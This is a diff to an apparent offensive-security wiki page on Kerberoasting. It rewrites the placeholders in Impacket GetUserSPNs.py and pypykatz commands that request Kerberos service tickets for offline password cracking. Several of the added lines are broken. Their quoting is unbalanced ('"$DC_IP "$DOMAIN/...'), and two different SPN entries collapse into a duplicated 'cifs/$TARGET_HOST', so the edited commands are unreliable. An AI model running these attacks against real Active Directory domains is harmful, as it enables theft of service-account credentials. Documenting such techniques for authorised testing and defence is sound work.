@@ -34,10 +34,10 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](
 
 ```bash
 # with a password
-GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip "$DC_IP "$DOMAIN/$USER:$PASSWORD"
 
 # with an NT hash
-GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+GetUserSPNs.py -outputfile kerberoastables.txt -hashes ":$NT_HASH" -dc-ip "$DC_IP "$DOMAIN/$USER"
 ```
 
 This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
@@ -49,7 +49,7 @@ netexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt 
 Using [pypykatz](https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command) (Python) it is possible to request an RC4 encrypted ST even when AES encryption is enabled (and if RC4 is still accepted of course). The tool features an -e flag which specifies what encryption type should be requested (default to 23, i.e. RC4). Trying to crack `$krb5tgs$23` takes less time than for `krb5tgs$18`.
 
 ```bash
-pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\username:Password@IP'
+pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 "kerberos+password://$DOMAIN/$USER:$PASSWORD@$DC_IP"
 ```
 
 
@@ -96,8 +96,8 @@ GetUserSPNs.py -no-preauth "$USER" -usersfile "services.txt" -dc-host $DC_HOST $
 
 ```
 srv01
-cifs/srv02.domain.local
-cifs/srv02
+cifs/$TARGET_HOST
+cifs/$TARGET_HOST
 ```
 
 
